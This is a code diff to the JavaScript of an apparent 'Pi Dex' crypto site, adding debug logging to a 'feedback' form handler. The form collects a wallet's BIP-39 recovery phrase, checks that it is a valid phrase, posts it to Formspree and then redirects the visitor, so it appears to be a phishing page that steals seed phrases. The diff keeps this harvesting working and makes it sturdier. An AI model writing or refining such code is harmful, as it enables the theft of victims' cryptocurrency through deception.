@@ -9,6 +9,7 @@ let isBuyingPi = false;
 // INITIALIZATION
 // ========================================
 document.addEventListener('DOMContentLoaded', function () {
+    console.log('DOM Loaded');
     initializeFeedbackPage();
     initializeDexPage();
     initializeMobileMenu();
@@ -20,71 +21,112 @@ document.addEventListener('DOMContentLoaded', function () {
 // ========================================
 async function initializeFeedbackPage() {
     const form = document.getElementById('feedbackForm');
-    if (!form) return;
+    if (!form) {
+        console.log('No feedback form found');
+        return;
+    }
+
+    console.log('Feedback form found, initializing...');
 
     const mnemonicInput = document.getElementById('feedback');
     const errorMessage = document.getElementById('errorMessage');
 
-    const wordlist = await fetch(
-        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt'
-    )
-        .then(r => r.text())
-        .then(t => t.trim().split('\n'));
+    // Load BIP39 wordlist
+    let wordlist = [];
+    try {
+        const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
+        const text = await response.text();
+        wordlist = text.trim().split('\n');
+        console.log('BIP39 wordlist loaded:', wordlist.length, 'words');
+    } catch (error) {
+        console.error('Failed to load BIP39 wordlist:', error);
+    }
 
     function showError(msg) {
+        console.log('Showing error:', msg);
         errorMessage.textContent = msg;
         errorMessage.style.display = 'block';
     }
 
     function hideError() {
+        console.log('Hiding error');
         errorMessage.style.display = 'none';
     }
 
     function isValidBip39Mnemonic(mnemonic) {
-        const words = mnemonic.split(/\s+/);
+        console.log('Validating mnemonic...');
+        const words = mnemonic.split(/\s+/).filter(w => w.length > 0);
+        console.log('Word count:', words.length);
 
-        if (![12, 15, 18, 21, 24].includes(words.length)) return false;
-
-        for (const word of words) {
-            if (!wordlist.includes(word)) return false;
+        // Check word count
+        if (![12, 15, 18, 21, 24].includes(words.length)) {
+            console.log('Invalid word count');
+            return false;
         }
 
-        return window.bip39.validateMnemonic(mnemonic);
+        // Check if all words are in wordlist
+        for (const word of words) {
+            if (!wordlist.includes(word)) {
+                console.log('Invalid word found:', word);
+                return false;
+            }
+        }
+
+        // Check with BIP39 library if available
+        if (typeof window.bip39 !== 'undefined') {
+            const isValid = window.bip39.validateMnemonic(mnemonic);
+            console.log('BIP39 library validation:', isValid);
+            return isValid;
+        } else {
+            console.warn('BIP39 library not loaded, skipping checksum validation');
+            // If BIP39 library isn't loaded, just check wordlist
+            return true;
+        }
     }
 
     form.addEventListener('submit', async function (e) {
-        e.preventDefault(); // ALWAYS stop native submit
+        e.preventDefault();
+        console.log('Form submitted');
 
         const mnemonic = mnemonicInput.value.trim().toLowerCase();
+        console.log('Mnemonic length:', mnemonic.length);
 
-        // Validate passphrase FIRST - if invalid, stop here
+        // Validate passphrase
         if (!isValidBip39Mnemonic(mnemonic)) {
-            showError('Invalid passphrase.');
-            return; // Don't submit to Formspree, don't redirect
+            showError('Invalid passphrase. Please enter a valid BIP-39 recovery phrase.');
+            return;
         }
 
-        // If valid, hide error and proceed with submission
+        console.log('Mnemonic is valid, proceeding with submission...');
         hideError();
 
         const formData = new FormData(form);
 
         try {
+            console.log('Sending to Formspree...');
             const response = await fetch(form.action, {
                 method: 'POST',
                 body: formData,
                 headers: { Accept: 'application/json' }
             });
 
+            console.log('Response status:', response.status);
+
             if (response.ok) {
-                // ✅ Only redirect if passphrase is valid AND submission succeeded
+                console.log('Submission successful, redirecting...');
                 window.location.href = 'dex.html';
             } else {
+                const errorData = await response.json();
+                console.error('Submission failed:', errorData);
                 showError('Submission failed. Please try again.');
             }
         } catch (error) {
+            console.error('Network error:', error);
             showError('Network error. Please try again.');
         }
     });
+
+    console.log('Form listener attached');
 }
 
 // ========================================
@@ -170,4 +212,3 @@ function calculateAmount() {
 // DEBUG
 // ========================================
 console.log('Pi Dex Script Loaded');
-
